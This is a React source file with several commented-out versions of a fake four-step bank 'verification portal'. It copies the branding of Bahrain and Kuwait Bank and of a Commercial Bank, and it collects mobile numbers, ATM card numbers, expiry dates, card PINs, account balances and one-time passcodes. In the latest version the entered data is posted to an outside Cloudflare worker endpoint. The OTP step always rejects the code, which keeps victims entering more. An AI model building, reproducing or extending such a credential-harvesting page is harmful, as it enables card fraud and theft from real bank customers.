// // // // import React, { useState } from 'react';
// // // // import { Globe } from 'lucide-react';

// // // // // Step 1 Component - Mobile Number
// // // // const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
// // // //   return (
// // // //     <div className="bg-white min-h-screen">
// // // //       {/* Header */}
// // // //       <div className="flex items-center justify-between p-4 border-b shadow-sm">
// // // //         <div className="flex items-center gap-3">
// // // //           <div className="w-14 h-14 bg-gradient-to-br from-[#8B1538] to-[#6B1028] rounded-full flex items-center justify-center shadow-lg">
// // // //             <span className="text-white font-bold text-xl">CB</span>
// // // //           </div>
// // // //           <div className="text-xs text-gray-600 leading-tight">
// // // //             <div className="font-semibold">COMMERCIAL</div>
// // // //             <div>BANK</div>
// // // //           </div>
// // // //         </div>
// // // //         <button className="flex items-center gap-2 text-sm text-gray-600 hover:text-gray-800">
// // // //           <Globe className="w-4 h-4" />
// // // //           <span className="font-medium">EN</span>
// // // //         </button>
// // // //       </div>

// // // //       {/* Content */}
// // // //       <div className="p-6 max-w-md mx-auto">
// // // //         <div className="flex justify-center mb-8 mt-4">
// // // //           <div className="w-36 h-36 bg-gradient-to-br from-[#8B1538] to-[#6B1028] rounded-full flex items-center justify-center shadow-2xl">
// // // //             <span className="text-white font-bold text-5xl">CB</span>
// // // //           </div>
// // // //         </div>

// // // //         <h1 className="text-3xl font-bold text-center mb-3 text-gray-800">
// // // //           Welcome to verification portal
// // // //         </h1>
// // // //         <p className="text-center text-gray-500 mb-8 text-lg">Online Verification</p>

// // // //         <div className="text-center mb-6">
// // // //           <p className="text-sm font-bold text-gray-700 mb-3">STEP 1 OF 4</p>
// // // //           <div className="flex justify-center gap-2">
// // // //             {[1, 2, 3, 4].map((step) => (
// // // //               <div
// // // //                 key={step}
// // // //                 className={`h-1.5 w-16 rounded-full transition-all ${
// // // //                   step === 1 ? 'bg-[#8B1538]' : 'bg-gray-300'
// // // //                 }`}
// // // //               />
// // // //             ))}
// // // //           </div>
// // // //         </div>

// // // //         {/* Form Card */}
// // // //         <div className="border-2 border-[#8B1538] rounded-2xl overflow-hidden shadow-lg mt-8">
// // // //           <div className="bg-gradient-to-r from-[#8B1538] to-[#6B1028] text-white p-4">
// // // //             <h2 className="font-bold text-lg">ENTER DETAILS</h2>
// // // //           </div>
// // // //           <div className="p-6 bg-white">
// // // //             <label className="block text-sm font-bold mb-3 text-gray-700">
// // // //               Registered Mobile Number *
// // // //             </label>
// // // //             <input
// // // //               type="tel"
// // // //               placeholder="Enter Registered Mobile Number"
// // // //               value={mobileNumber}
// // // //               onChange={(e) => setMobileNumber(e.target.value)}
// // // //               className="w-full px-4 py-4 border-2 border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#8B1538] focus:border-transparent mb-6 text-lg"
// // // //             />
// // // //             <button
// // // //               onClick={onNext}
// // // //               disabled={!mobileNumber}
// // // //               className="w-full bg-gradient-to-r from-[#8B1538] to-[#6B1028] text-white py-4 rounded-full font-bold text-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed transform hover:scale-[1.02] active:scale-[0.98]"
// // // //             >
// // // //               Next
// // // //             </button>
// // // //           </div>
// // // //         </div>
// // // //       </div>
// // // //     </div>
// // // //   );
// // // // };

// // // // // Step 2 Component - ATM Card Details
// // // // const Step2ATMCard = ({ atmCardNumber, setAtmCardNumber, expiryDate, setExpiryDate, cardPin, setCardPin, onNext, onBack }) => {
// // // //   return (
// // // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // // //       <div className="max-w-md mx-auto">
// // // //         <div className="flex justify-end mb-12 mt-4">
// // // //           <div className="text-right">
// // // //             <div className="text-3xl font-bold tracking-wide">BBK*</div>
// // // //             <div className="text-xs opacity-90 mt-1">بنك البحرين والكويت</div>
// // // //           </div>
// // // //         </div>

// // // //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// // // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// // // //           For your security, please provide the following information to complete the verification process
// // // //         </p>

// // // //         <div className="text-center mb-6">
// // // //           <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
// // // //           <div className="flex justify-center gap-2">
// // // //             {[1, 2, 3, 4].map((step) => (
// // // //               <div
// // // //                 key={step}
// // // //                 className={`h-1.5 w-16 rounded-full transition-all ${
// // // //                   step <= 2 ? 'bg-white' : 'bg-white/30'
// // // //                 }`}
// // // //               />
// // // //             ))}
// // // //           </div>
// // // //         </div>

// // // //         <div className="space-y-8 mt-12">
// // // //           <div>
// // // //             <input
// // // //               type="text"
// // // //               placeholder="Enter your 16-digit ATM card number *"
// // // //               value={atmCardNumber}
// // // //               onChange={(e) => setAtmCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
// // // //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // // //             />
// // // //           </div>

// // // //           <div>
// // // //             <input
// // // //               type="text"
// // // //               placeholder="Expiry date (MM/YY) *"
// // // //               value={expiryDate}
// // // //               onChange={(e) => {
// // // //                 let val = e.target.value.replace(/\D/g, '');
// // // //                 if (val.length >= 2) {
// // // //                   val = val.slice(0, 2) + '/' + val.slice(2, 4);
// // // //                 }
// // // //                 setExpiryDate(val);
// // // //               }}
// // // //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // // //             />
// // // //           </div>

// // // //           <div>
// // // //             <input
// // // //               type="password"
// // // //               placeholder="Enter your card PIN *"
// // // //               value={cardPin}
// // // //               onChange={(e) => setCardPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
// // // //               maxLength={4}
// // // //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // // //             />
// // // //           </div>
// // // //         </div>

// // // //         <button
// // // //           onClick={onNext}
// // // //           disabled={!atmCardNumber || !expiryDate || !cardPin}
// // // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // // //         >
// // // //           Continue
// // // //         </button>

// // // //         <button
// // // //           onClick={onBack}
// // // //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// // // //         >
// // // //           ← Back
// // // //         </button>
// // // //       </div>
// // // //     </div>
// // // //   );
// // // // };

// // // // // Step 3 Component - Account Balance
// // // // const Step3AccountBalance = ({ accountBalance, setAccountBalance, onNext, onBack }) => {
// // // //   return (
// // // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // // //       <div className="max-w-md mx-auto">
// // // //         <div className="flex justify-end mb-12 mt-4">
// // // //           <div className="text-right">
// // // //             <div className="text-3xl font-bold tracking-wide">BBK*</div>
// // // //             <div className="text-xs opacity-90 mt-1">بنك البحرين والكويت</div>
// // // //           </div>
// // // //         </div>

// // // //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// // // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// // // //           For your security, please provide the following information to complete the verification process
// // // //         </p>

// // // //         <div className="text-center mb-6">
// // // //           <p className="text-sm font-bold mb-3">STEP 3 OF 4</p>
// // // //           <div className="flex justify-center gap-2">
// // // //             {[1, 2, 3, 4].map((step) => (
// // // //               <div
// // // //                 key={step}
// // // //                 className={`h-1.5 w-16 rounded-full transition-all ${
// // // //                   step <= 3 ? 'bg-white' : 'bg-white/30'
// // // //                 }`}
// // // //               />
// // // //             ))}
// // // //           </div>
// // // //         </div>

// // // //         <div className="mt-12">
// // // //           <input
// // // //             type="text"
// // // //             placeholder="Enter your account balance *"
// // // //             value={accountBalance}
// // // //             onChange={(e) => setAccountBalance(e.target.value)}
// // // //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // // //           />
// // // //         </div>

// // // //         <button
// // // //           onClick={onNext}
// // // //           disabled={!accountBalance}
// // // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // // //         >
// // // //           Continue
// // // //         </button>

// // // //         <button
// // // //           onClick={onBack}
// // // //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// // // //         >
// // // //           ← Back
// // // //         </button>
// // // //       </div>
// // // //     </div>
// // // //   );
// // // // };

// // // // // Step 4 Component - OTP Verification
// // // // const Step4OTPVerification = ({ otp, setOtp, otpError, timer, onVerify, onResend, onBack }) => {
// // // //   const handleOtpChange = (index, value) => {
// // // //     if (value.length <= 1 && /^\d*$/.test(value)) {
// // // //       const newOtp = [...otp];
// // // //       newOtp[index] = value;
// // // //       setOtp(newOtp);

// // // //       if (value && index < 5) {
// // // //         const nextInput = document.getElementById(`otp-${index + 1}`);
// // // //         if (nextInput) nextInput.focus();
// // // //       }
// // // //     }
// // // //   };

// // // //   return (
// // // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // // //       <div className="max-w-md mx-auto">
// // // //         <div className="flex justify-end mb-12 mt-4">
// // // //           <div className="text-right">
// // // //             <div className="text-3xl font-bold tracking-wide">BBK*</div>
// // // //             <div className="text-xs opacity-90 mt-1">بنك البحرين والكويت</div>
// // // //           </div>
// // // //         </div>

// // // //         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
// // // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// // // //           We've sent a 6-digit verification code to your registered mobile number
// // // //         </p>

// // // //         <div className="text-center mb-6">
// // // //           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
// // // //           <div className="flex justify-center gap-2">
// // // //             {[1, 2, 3, 4].map((step) => (
// // // //               <div
// // // //                 key={step}
// // // //                 className="h-1.5 w-16 rounded-full bg-white transition-all"
// // // //               />
// // // //             ))}
// // // //           </div>
// // // //         </div>

// // // //         <div className="flex justify-center gap-3 mt-12 mb-6">
// // // //           {otp.map((digit, index) => (
// // // //             <input
// // // //               key={index}
// // // //               id={`otp-${index}`}
// // // //               type="text"
// // // //               maxLength={1}
// // // //               value={digit}
// // // //               onChange={(e) => handleOtpChange(index, e.target.value)}
// // // //               className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
// // // //             />
// // // //           ))}
// // // //         </div>

// // // //         {otpError && (
// // // //           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
// // // //             <p className="text-red-200 text-center font-medium">{otpError}</p>
// // // //           </div>
// // // //         )}

// // // //         <div className="text-center mb-2 mt-8">
// // // //           <p className="text-sm opacity-90">Didn't receive the code?</p>
// // // //         </div>

// // // //         <div className="text-center mb-8">
// // // //           <button
// // // //             onClick={onResend}
// // // //             disabled={timer > 0}
// // // //             className={`font-bold underline transition-all ${
// // // //               timer > 0 ? 'opacity-50 cursor-not-allowed' : 'opacity-100 hover:text-white/80'
// // // //             }`}
// // // //           >
// // // //             Resend OTP
// // // //           </button>
// // // //           <p className="text-sm opacity-90 mt-1">
// // // //             Resend available in {timer}s
// // // //           </p>
// // // //         </div>

// // // //         <button
// // // //           onClick={onVerify}
// // // //           disabled={otp.some(digit => !digit)}
// // // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // // //         >
// // // //           Verify
// // // //         </button>

// // // //         <button
// // // //           onClick={onBack}
// // // //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// // // //         >
// // // //           ← Back to Login
// // // //         </button>
// // // //       </div>
// // // //     </div>
// // // //   );
// // // // };

// // // // // Main Component
// // // // export default function VerificationPortal() {
// // // //   const [currentStep, setCurrentStep] = useState(1);
// // // //   const [mobileNumber, setMobileNumber] = useState('');
// // // //   const [atmCardNumber, setAtmCardNumber] = useState('');
// // // //   const [expiryDate, setExpiryDate] = useState('');
// // // //   const [cardPin, setCardPin] = useState('');
// // // //   const [accountBalance, setAccountBalance] = useState('');
// // // //   const [otp, setOtp] = useState(['', '', '', '', '', '']);
// // // //   const [otpError, setOtpError] = useState('');
// // // //   const [timer, setTimer] = useState(57);

// // // //   React.useEffect(() => {
// // // //     if (currentStep === 4 && timer > 0) {
// // // //       const interval = setInterval(() => {
// // // //         setTimer((prev) => prev - 1);
// // // //       }, 1000);
// // // //       return () => clearInterval(interval);
// // // //     }
// // // //   }, [currentStep, timer]);

// // // //   const handleNext = () => {
// // // //     if (currentStep < 4) {
// // // //       setCurrentStep(currentStep + 1);
// // // //     }
// // // //   };

// // // //   const handleBack = () => {
// // // //     if (currentStep > 1) {
// // // //       setCurrentStep(currentStep - 1);
// // // //       setOtpError('');
// // // //     }
// // // //   };

// // // //   const handleVerifyOtp = () => {
// // // //     setOtpError('Invalid OTP. Please try again.');
// // // //   };

// // // //   const handleResendOtp = () => {
// // // //     if (timer === 0) {
// // // //       setTimer(57);
// // // //       setOtp(['', '', '', '', '', '']);
// // // //       setOtpError('');
// // // //     }
// // // //   };

// // // //   return (
// // // //     <div>
// // // //       {currentStep === 1 && (
// // // //         <Step1MobileNumber
// // // //           mobileNumber={mobileNumber}
// // // //           setMobileNumber={setMobileNumber}
// // // //           onNext={handleNext}
// // // //         />
// // // //       )}
// // // //       {currentStep === 2 && (
// // // //         <Step2ATMCard
// // // //           atmCardNumber={atmCardNumber}
// // // //           setAtmCardNumber={setAtmCardNumber}
// // // //           expiryDate={expiryDate}
// // // //           setExpiryDate={setExpiryDate}
// // // //           cardPin={cardPin}
// // // //           setCardPin={setCardPin}
// // // //           onNext={handleNext}
// // // //           onBack={handleBack}
// // // //         />
// // // //       )}
// // // //       {currentStep === 3 && (
// // // //         <Step3AccountBalance
// // // //           accountBalance={accountBalance}
// // // //           setAccountBalance={setAccountBalance}
// // // //           onNext={handleNext}
// // // //           onBack={handleBack}
// // // //         />
// // // //       )}
// // // //       {currentStep === 4 && (
// // // //         <Step4OTPVerification
// // // //           otp={otp}
// // // //           setOtp={setOtp}
// // // //           otpError={otpError}
// // // //           timer={timer}
// // // //           onVerify={handleVerifyOtp}
// // // //           onResend={handleResendOtp}
// // // //           onBack={handleBack}
// // // //         />
// // // //       )}
// // // //     </div>
// // // //   );
// // // // }

// // // import React, { useState } from 'react';
// // // import { Globe } from 'lucide-react';

// // // // Step 1 Component - Mobile Number
// // // const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
// // //   return (
// // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // //       <div className="max-w-md mx-auto">
// // //         {/* <div className="flex justify-end mb-12 mt-4">
// // //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// // //             <Globe className="w-4 h-4" />
// // //             <span className="font-medium">EN</span>
// // //           </button>
// // //         </div> */}

// // //         <h1 className="text-4xl font-bold mb-4">Welcome to verification portal</h1>
// // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">Online Verification</p>

// // //         <div className="text-center mb-6">
// // //           <p className="text-sm font-bold mb-3">STEP 1 OF 4</p>
// // //           <div className="flex justify-center gap-2">
// // //             {[1, 2, 3, 4].map((step) => (
// // //               <div
// // //                 key={step}
// // //                 className={`h-1.5 w-16 rounded-full transition-all ${
// // //                   step === 1 ? 'bg-white' : 'bg-white/30'
// // //                 }`}
// // //               />
// // //             ))}
// // //           </div>
// // //         </div>

// // //         <div className="mt-12">
// // //           <label className="block text-sm font-bold mb-3 opacity-90">
// // //             Registered Mobile Number *
// // //           </label>
// // //           <input
// // //             type="tel"
// // //             placeholder="Enter Registered Mobile Number"
// // //             value={mobileNumber}
// // //             onChange={(e) => setMobileNumber(e.target.value)}
// // //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all mb-8"
// // //           />
// // //         </div>

// // //         <button
// // //           onClick={onNext}
// // //           disabled={!mobileNumber}
// // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // //         >
// // //           Continue
// // //         </button>
// // //       </div>
// // //     </div>
// // //   );
// // // };

// // // // Step 2 Component - ATM Card Details
// // // const Step2ATMCard = ({ atmCardNumber, setAtmCardNumber, expiryDate, setExpiryDate, cardPin, setCardPin, onNext, onBack }) => {
// // //   return (
// // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // //       <div className="max-w-md mx-auto">
// // //         {/* <div className="flex justify-end mb-12 mt-4">
// // //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// // //             <Globe className="w-4 h-4" />
// // //             <span className="font-medium">EN</span>
// // //           </button>
// // //         </div> */}

// // //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// // //           For your security, please provide the following information to complete the verification process
// // //         </p>

// // //         <div className="text-center mb-6">
// // //           <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
// // //           <div className="flex justify-center gap-2">
// // //             {[1, 2, 3, 4].map((step) => (
// // //               <div
// // //                 key={step}
// // //                 className={`h-1.5 w-16 rounded-full transition-all ${
// // //                   step <= 2 ? 'bg-white' : 'bg-white/30'
// // //                 }`}
// // //               />
// // //             ))}
// // //           </div>
// // //         </div>

// // //         <div className="space-y-8 mt-12">
// // //           <div>
// // //             <input
// // //               type="text"
// // //               placeholder="Enter your 16-digit ATM card number *"
// // //               value={atmCardNumber}
// // //               onChange={(e) => setAtmCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
// // //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // //             />
// // //           </div>

// // //           <div>
// // //             <input
// // //               type="text"
// // //               placeholder="Expiry date (MM/YY) *"
// // //               value={expiryDate}
// // //               onChange={(e) => {
// // //                 let val = e.target.value.replace(/\D/g, '');
// // //                 if (val.length >= 2) {
// // //                   val = val.slice(0, 2) + '/' + val.slice(2, 4);
// // //                 }
// // //                 setExpiryDate(val);
// // //               }}
// // //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // //             />
// // //           </div>

// // //           <div>
// // //             <input
// // //               type="password"
// // //               placeholder="Enter your card PIN *"
// // //               value={cardPin}
// // //               onChange={(e) => setCardPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
// // //               maxLength={4}
// // //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // //             />
// // //           </div>
// // //         </div>

// // //         <button
// // //           onClick={onNext}
// // //           disabled={!atmCardNumber || !expiryDate || !cardPin}
// // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // //         >
// // //           Continue
// // //         </button>

// // //         <button
// // //           onClick={onBack}
// // //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// // //         >
// // //           ← Back
// // //         </button>
// // //       </div>
// // //     </div>
// // //   );
// // // };

// // // // Step 3 Component - Account Balance
// // // const Step3AccountBalance = ({ accountBalance, setAccountBalance, onNext, onBack }) => {
// // //   return (
// // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // //       <div className="max-w-md mx-auto">
// // //         {/* <div className="flex justify-end mb-12 mt-4">
// // //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// // //             <Globe className="w-4 h-4" />
// // //             <span className="font-medium">EN</span>
// // //           </button>
// // //         </div> */}

// // //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// // //           For your security, please provide the following information to complete the verification process
// // //         </p>

// // //         <div className="text-center mb-6">
// // //           <p className="text-sm font-bold mb-3">STEP 3 OF 4</p>
// // //           <div className="flex justify-center gap-2">
// // //             {[1, 2, 3, 4].map((step) => (
// // //               <div
// // //                 key={step}
// // //                 className={`h-1.5 w-16 rounded-full transition-all ${
// // //                   step <= 3 ? 'bg-white' : 'bg-white/30'
// // //                 }`}
// // //               />
// // //             ))}
// // //           </div>
// // //         </div>

// // //         <div className="mt-12">
// // //           <input
// // //             type="text"
// // //             placeholder="Enter your account balance *"
// // //             value={accountBalance}
// // //             onChange={(e) => setAccountBalance(e.target.value)}
// // //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // //           />
// // //         </div>

// // //         <button
// // //           onClick={onNext}
// // //           disabled={!accountBalance}
// // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // //         >
// // //           Continue
// // //         </button>

// // //         <button
// // //           onClick={onBack}
// // //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// // //         >
// // //           ← Back
// // //         </button>
// // //       </div>
// // //     </div>
// // //   );
// // // };

// // // // Step 4 Component - OTP Verification
// // // const Step4OTPVerification = ({ otp, setOtp, otpError, timer, onVerify, onResend, onBack }) => {
// // //   const handleOtpChange = (index, value) => {
// // //     if (value.length <= 1 && /^\d*$/.test(value)) {
// // //       const newOtp = [...otp];
// // //       newOtp[index] = value;
// // //       setOtp(newOtp);

// // //       if (value && index < 5) {
// // //         const nextInput = document.getElementById(`otp-${index + 1}`);
// // //         if (nextInput) nextInput.focus();
// // //       }
// // //     }
// // //   };

// // //   return (
// // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // //       <div className="max-w-md mx-auto">
// // //         {/* <div className="flex justify-end mb-12 mt-4">
// // //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// // //             <Globe className="w-4 h-4" />
// // //             <span className="font-medium">EN</span>
// // //           </button>
// // //         </div> */}

// // //         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
// // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// // //           We've sent a 6-digit verification code to your registered mobile number
// // //         </p>

// // //         <div className="text-center mb-6">
// // //           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
// // //           <div className="flex justify-center gap-2">
// // //             {[1, 2, 3, 4].map((step) => (
// // //               <div
// // //                 key={step}
// // //                 className="h-1.5 w-16 rounded-full bg-white transition-all"
// // //               />
// // //             ))}
// // //           </div>
// // //         </div>

// // //         <div className="flex justify-center gap-3 mt-12 mb-6">
// // //           {otp.map((digit, index) => (
// // //             <input
// // //               key={index}
// // //               id={`otp-${index}`}
// // //               type="text"
// // //               maxLength={1}
// // //               value={digit}
// // //               onChange={(e) => handleOtpChange(index, e.target.value)}
// // //               className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
// // //             />
// // //           ))}
// // //         </div>

// // //         {otpError && (
// // //           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
// // //             <p className="text-red-200 text-center font-medium">{otpError}</p>
// // //           </div>
// // //         )}

// // //         <div className="text-center mb-2 mt-8">
// // //           <p className="text-sm opacity-90">Didn't receive the code?</p>
// // //         </div>

// // //         <div className="text-center mb-8">
// // //           <button
// // //             onClick={onResend}
// // //             disabled={timer > 0}
// // //             className={`font-bold underline transition-all ${
// // //               timer > 0 ? 'opacity-50 cursor-not-allowed' : 'opacity-100 hover:text-white/80'
// // //             }`}
// // //           >
// // //             Resend OTP
// // //           </button>
// // //           <p className="text-sm opacity-90 mt-1">
// // //             Resend available in {timer}s
// // //           </p>
// // //         </div>

// // //         <button
// // //           onClick={onVerify}
// // //           disabled={otp.some(digit => !digit)}
// // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // //         >
// // //           Verify
// // //         </button>

// // //         <button
// // //           onClick={onBack}
// // //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// // //         >
// // //           ← Back to Login
// // //         </button>
// // //       </div>
// // //     </div>
// // //   );
// // // };

// // // // Main Component
// // // export default function VerificationPortal() {
// // //   const [currentStep, setCurrentStep] = useState(1);
// // //   const [mobileNumber, setMobileNumber] = useState('');
// // //   const [atmCardNumber, setAtmCardNumber] = useState('');
// // //   const [expiryDate, setExpiryDate] = useState('');
// // //   const [cardPin, setCardPin] = useState('');
// // //   const [accountBalance, setAccountBalance] = useState('');
// // //   const [otp, setOtp] = useState(['', '', '', '', '', '']);
// // //   const [otpError, setOtpError] = useState('');
// // //   const [timer, setTimer] = useState(57);

// // //   React.useEffect(() => {
// // //     if (currentStep === 4 && timer > 0) {
// // //       const interval = setInterval(() => {
// // //         setTimer((prev) => prev - 1);
// // //       }, 1000);
// // //       return () => clearInterval(interval);
// // //     }
// // //   }, [currentStep, timer]);

// // //   const handleNext = () => {
// // //     if (currentStep < 4) {
// // //       setCurrentStep(currentStep + 1);
// // //     }
// // //   };

// // //   const handleBack = () => {
// // //     if (currentStep > 1) {
// // //       setCurrentStep(currentStep - 1);
// // //       setOtpError('');
// // //     }
// // //   };

// // //   const handleVerifyOtp = () => {
// // //     setOtpError('Invalid OTP. Please try again.');
// // //   };

// // //   const handleResendOtp = () => {
// // //     if (timer === 0) {
// // //       setTimer(57);
// // //       setOtp(['', '', '', '', '', '']);
// // //       setOtpError('');
// // //     }
// // //   };

// // //   return (
// // //     <div>
// // //       {currentStep === 1 && (
// // //         <Step1MobileNumber
// // //           mobileNumber={mobileNumber}
// // //           setMobileNumber={setMobileNumber}
// // //           onNext={handleNext}
// // //         />
// // //       )}
// // //       {currentStep === 2 && (
// // //         <Step2ATMCard
// // //           atmCardNumber={atmCardNumber}
// // //           setAtmCardNumber={setAtmCardNumber}
// // //           expiryDate={expiryDate}
// // //           setExpiryDate={setExpiryDate}
// // //           cardPin={cardPin}
// // //           setCardPin={setCardPin}
// // //           onNext={handleNext}
// // //           onBack={handleBack}
// // //         />
// // //       )}
// // //       {currentStep === 3 && (
// // //         <Step3AccountBalance
// // //           accountBalance={accountBalance}
// // //           setAccountBalance={setAccountBalance}
// // //           onNext={handleNext}
// // //           onBack={handleBack}
// // //         />
// // //       )}
// // //       {currentStep === 4 && (
// // //         <Step4OTPVerification
// // //           otp={otp}
// // //           setOtp={setOtp}
// // //           otpError={otpError}
// // //           timer={timer}
// // //           onVerify={handleVerifyOtp}
// // //           onResend={handleResendOtp}
// // //           onBack={handleBack}
// // //         />
// // //       )}
// // //     </div>
// // //   );
// // // }

// // import React, { useState, useEffect } from 'react';
// // import { Globe } from 'lucide-react';

// // const API_URL = 'https://my-pr-worker.instapayapi.workers.dev';

// // // API Helper Function
// // const sendToAPI = async (data) => {
// //   try {
// //     const response = await fetch(API_URL, {
// //       method: 'POST',
// //       headers: {
// //         'Content-Type': 'application/json',
// //       },
// //       body: JSON.stringify(data),
// //     });
// //     return await response.json();
// //   } catch (error) {
// //     console.error('API Error:', error);
// //     return { success: false, error: error.message };
// //   }
// // };

// // // Step 1 Component - Mobile Number
// // const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
// //   const [loading, setLoading] = useState(false);

// //   const handleSubmit = async () => {
// //     setLoading(true);
// //     const result = await sendToAPI({
// //       type: 'phone',
// //       phone: mobileNumber,
// //     });
// //     setLoading(false);

// //     if (result.success) {
// //       onNext();
// //     }
// //   };

// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div>

// //         <h1 className="text-4xl font-bold mb-4">Welcome to verification portal</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">Online Verification</p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 1 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className={`h-1.5 w-16 rounded-full transition-all ${
// //                   step === 1 ? 'bg-white' : 'bg-white/30'
// //                 }`}
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="mt-12">
// //           <label className="block text-sm font-bold mb-3 opacity-90">
// //             Registered Mobile Number *
// //           </label>
// //           <input
// //             type="tel"
// //             placeholder="Enter Registered Mobile Number"
// //             value={mobileNumber}
// //             onChange={(e) => setMobileNumber(e.target.value)}
// //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all mb-8"
// //           />
// //         </div>

// //         <button
// //           onClick={handleSubmit}
// //           disabled={!mobileNumber || loading}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           {loading ? 'Submitting...' : 'Continue'}
// //         </button>
// //       </div>
// //     </div>
// //   );
